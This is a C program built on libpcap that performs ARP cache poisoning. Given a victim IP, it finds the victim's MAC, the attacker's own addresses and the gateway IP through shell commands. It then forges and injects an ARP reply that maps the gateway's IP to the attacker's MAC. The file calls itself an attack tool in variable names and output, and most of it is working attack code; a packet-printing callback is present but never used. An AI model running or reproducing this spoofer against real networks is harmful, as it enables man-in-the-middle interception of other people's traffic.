#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <net/ethernet.h>
#include <netinet/ip_icmp.h>
#include <unistd.h>
#include <string.h>

#define PROMISCUOUS 1
#define NONPROMISCUOUS 0

#define ETHER_IP 0x0800
#define ETHER_ARP 0x0806

#define ARP_REQ 1
#define ARP_RPY 2

#define ARP_ETHER 1

struct tcp_hdr
{
	unsigned short sport;
	unsigned short dport;
	unsigned int sequence;
	unsigned int acknow;
	unsigned char ns;
	unsigned char rpart;
	unsigned char offset;
	unsigned char fin;
	unsigned char sys;
	unsigned char rst;
	unsigned char psh;
	unsigned char ack;
	unsigned char urg;
	unsigned char enc;
	unsigned char cwr;
	unsigned short window;
	unsigned short checksum;
	unsigned short urgent;
};
	
struct arp
{
	uint16_t hrd;
	uint16_t pro;
	uint8_t hln;
	uint8_t pln;
	uint16_t op;
	u_char sha[6];
	u_char spa[4];
	u_char tha[6];
	u_char tpa[4];
};

struct eth_addr
{
	uint8_t oct[6];
};

#define IP_TCP  6
void callback(u_char* useless, const struct pcap_pkthdr* pkthdr, const u_char* packet)
{
	static int count = 1;
	struct ether_header* ehdr;
	unsigned short ether_type;
	int chcnt = 0;
	int length = pkthdr->len;
	struct ip* iphdr;
	struct tcp_hdr* tcphdr;
	struct arp* arphdr;
	struct in_addr arp_temp;

	ehdr = (struct ether_header*)packet;
	ether_type = ntohs(ehdr->ether_type);
	
	if(ether_type ==  ETHER_IP)
	{
		packet += sizeof(struct ether_header);
		iphdr = (struct ip*)packet;
		if(iphdr->ip_p == IP_TCP)
		{
			printf("\nEther Info...\n");
			printf("Dhost : %02x:%02x:%02x:%02x:%02x:%02x\n", ehdr->ether_dhost[0], ehdr->ether_dhost[1], ehdr->ether_dhost[2], ehdr->ether_dhost[3], ehdr->ether_dhost[4], ehdr->ether_dhost[5]);
			printf("Shost : %02x:%02x:%02x:%02x:%02x:%02x\n", ehdr->ether_shost[0], ehdr->ether_shost[1], ehdr->ether_shost[2], ehdr->ether_shost[3], ehdr->ether_shost[4], ehdr->ether_shost[5]);
	
			printf("TCP Packet Captured!\n");
			printf("\nIP Info...\n");
			printf("Source IP : %s\n", inet_ntoa(iphdr->ip_src));
			printf("Desti  IP : %s\n", inet_ntoa(iphdr->ip_dst));
			printf("\nTCP Info...\n");
			tcphdr = (struct tcp_hdr*)(packet + iphdr->ip_hl * 4);
			printf("Src Port : %d\n", ntohs(tcphdr->sport));
			printf("Dst Port : %d\n", ntohs(tcphdr->dport));
			
		}
		
	}
	else if(ether_type == ETHER_ARP)
	{
		arphdr = (struct arp*)(packet + sizeof(struct ether_header));	
		printf("\nEther Info...\n");
		printf("Dhost : %02x:%02x:%02x:%02x:%02x:%02x\n", ehdr->ether_dhost[0], ehdr->ether_dhost[1], ehdr->ether_dhost[2], ehdr->ether_dhost[3], ehdr->ether_dhost[4], ehdr->ether_dhost[5]);
		printf("Shost : %02x:%02x:%02x:%02x:%02x:%02x\n", ehdr->ether_shost[0], ehdr->ether_shost[1], ehdr->ether_shost[2], ehdr->ether_shost[3], ehdr->ether_shost[4], ehdr->ether_shost[5]);
		printf("ARP Packet Captured!\n");
		if(ntohs(arphdr->op) == ARP_REQ)
		{
			printf("This Arp is REQ\n");
		}
		if(ntohs(arphdr->op) == ARP_RPY)
		{
			printf("This Arp is Reply\n");
		}
		printf("sMac : %02x:%02x:%02x:%02x:%02x:%02x\n", arphdr->sha[0], arphdr->sha[1], arphdr->sha[2], arphdr->sha[3], arphdr->sha[4], arphdr->sha[5]);
		printf("dMac : %02x:%02x:%02x:%02x:%02x:%02x\n", arphdr->tha[0], arphdr->tha[1], arphdr->tha[2], arphdr->tha[3], arphdr->tha[4], arphdr->tha[5]);
		memcpy(&arp_temp, arphdr->spa, sizeof(arp_temp));
		printf("sIP  : %s\n", inet_ntoa(arp_temp));
		memcpy(&arp_temp, arphdr->tpa, sizeof(arp_temp));
		printf("dIP  : %s\n", inet_ntoa(arp_temp));	
	}
}


/*typedef uint32_t in_addr_t;
struct in_addr
{
	in_addr_t s_addr;
};*/

int main(int argc, char** argv)
{
//argv[1] is victim IP
//save argv[1] -> vic_IP , use inet_aton()

	FILE* fp;

	char* dev;
	char* net;
	char* mask;
	int ret;
	char errbuf[PCAP_ERRBUF_SIZE];
	
	bpf_u_int32 netp;
	bpf_u_int32 maskp;

	struct pcap_pkthdr hdr;
	struct in_addr net_addr, mask_addr;
	struct ether_header* ehdr;
	const u_char* packet;
	
	struct in_addr arp_temp;
	
	
	struct in_addr att_IP, vic_IP, gwy_IP;
	struct eth_addr att_MAC, vic_MAC;

	char cmd[256] = {0x0};
	char IPbuf[20] = {0x0};
	char MACbuf[20] = {0x0};

	pcap_t* pcd;

	dev = pcap_lookupdev(errbuf);
	if(dev == NULL)
	{
		printf("%s\n", errbuf);
		return -1;
	}

	printf("DEV : %s\n", dev);

	ret = pcap_lookupnet(dev, &netp, &maskp, errbuf);
	if(ret == -1)
	{
		printf("%s\n", errbuf);
		return -1;
	}
	
	net_addr.s_addr = netp;
	net = inet_ntoa(net_addr);
	
	
	mask_addr.s_addr = maskp;
	mask = inet_ntoa(mask_addr);
	
	//argv[1] ->vic_IP
	if(inet_aton(argv[1], &vic_IP) == 0)
	{
		printf("Incorrect Victim IP try again!\n");
		return -1;
	}
	
	printf("Victim IP is %s\n", inet_ntoa(vic_IP));

	pcd = pcap_open_live(dev, BUFSIZ, NONPROMISCUOUS, -1, errbuf);
	if(pcd == NULL)
	{
		printf("%s\n", errbuf);
		return -1;
	}


	inet_ntop(AF_INET, &vic_IP, IPbuf, sizeof(IPbuf));

	sprintf(cmd, "ping -c 1 %s > /dev/null", IPbuf);
	system(cmd);
	sprintf(cmd, "arp %s | grep '%s' | awk '{print $3}'", inet_ntoa(vic_IP), dev);
 	fp = popen(cmd, "r");
	fgets(MACbuf, sizeof(MACbuf), fp);
	pclose(fp);
	ether_aton_r(MACbuf, &vic_MAC);
	printf("VIctim MAC :%02x:%02x:%02x:%02x:%02x:%02x\n", vic_MAC.oct[0], vic_MAC.oct[1], vic_MAC.oct[2], vic_MAC.oct[3], vic_MAC.oct[4], vic_MAC.oct[5]);

	//success Victim IP, MAC

	//get my IP, MAC
	
	sprintf(cmd, "ifconfig | grep -A 1 %s | grep 'inet addr' | awk '{print $2}' | awk -F ':' '{print $2}'", dev);
	fp = popen(cmd, "r");
	fgets(IPbuf, sizeof(IPbuf), fp);
	pclose(fp);
	inet_aton(IPbuf, &att_IP);
	printf("Attacker IP : %s\n", inet_ntoa(att_IP));

	sprintf(cmd, "ifconfig | grep %s | awk '{print $5}'", dev);
	fp = popen(cmd, "r");
	fgets(MACbuf, sizeof(MACbuf), fp);
	pclose(fp);
	ether_aton_r(MACbuf, &att_MAC);
	printf("Attacker MAC :%02x:%02x:%02x:%02x:%02x:%02x\n", att_MAC.oct[0], att_MAC.oct[1], att_MAC.oct[2], att_MAC.oct[3], att_MAC.oct[4], att_MAC.oct[5]);


	//get getway IP
	sprintf(cmd, "route -n | grep %s | grep 'UG' | awk '{print $2}'", dev);
	fp = popen(cmd, "r");
	fgets(IPbuf, sizeof(IPbuf), fp);
	pclose(fp);
	inet_aton(IPbuf, &gwy_IP);
	printf("Gate Way IP : %s\n", inet_ntoa(gwy_IP));
	//success collect all info

	

	//make ARP attack packet;
	u_char att_packet[sizeof(struct ether_header) + sizeof(struct arp)];
	struct ether_header att_ehdr;
	struct arp att_arphdr;

	//ether part
	att_ehdr.ether_type = htons(ETHER_ARP);
	memcpy(att_ehdr.ether_dhost, vic_MAC.oct, sizeof(char) * 6);
	memcpy(att_ehdr.ether_shost, att_MAC.oct, sizeof(char) * 6);
	printf("ATTACK PACKET DMAC : %02x:%02x:%02x:%02x:%02x:%02x\n", att_ehdr.ether_dhost[0], att_ehdr.ether_dhost[1], att_ehdr.ether_dhost[2], att_ehdr.ether_dhost[3], att_ehdr.ether_dhost[4], att_ehdr.ether_dhost[5]);

	//arp part
	att_arphdr.hrd = htons(ARP_ETHER);
	att_arphdr.pro = htons(ETHER_IP);
	att_arphdr.hln = sizeof(struct eth_addr);
	att_arphdr.pln = sizeof(struct in_addr);
	att_arphdr.op = htons(ARP_RPY);
	
	memcpy(att_arphdr.sha, att_MAC.oct, sizeof(char) * 6);
	memcpy(att_arphdr.spa, &gwy_IP.s_addr, sizeof(in_addr_t));
	
	memcpy(&arp_temp, att_arphdr.spa, sizeof(in_addr_t));
	printf("ATT PACKET ATT IP : %s\n", inet_ntoa(arp_temp));

	memcpy(att_arphdr.tha, vic_MAC.oct, sizeof(char) * 6);
	memcpy(att_arphdr.tpa, &vic_IP.s_addr, sizeof(in_addr_t));

	memcpy(&arp_temp, att_arphdr.tpa, sizeof(in_addr_t));
	printf("ATT PACKET VIC IP : %s\n", inet_ntoa(arp_temp));
	
	//make complete packet
	memcpy(att_packet, &att_ehdr, sizeof(struct ether_header));
	memcpy(att_packet + sizeof(struct ether_header), &att_arphdr, sizeof(struct arp));	
	//pcap_loop(pcd, -1, callback, NULL);


	//check packet
	int i = 0;
	for(i=0; i<sizeof(struct ether_header) + sizeof(struct arp);i++)
	{
		printf("%02x ", att_packet[i]);
		if(((i + 1) % 6) == 0)
			printf("\n");
	}

	
	pcap_inject(pcd, att_packet, sizeof(att_packet));	
	return 0;
}
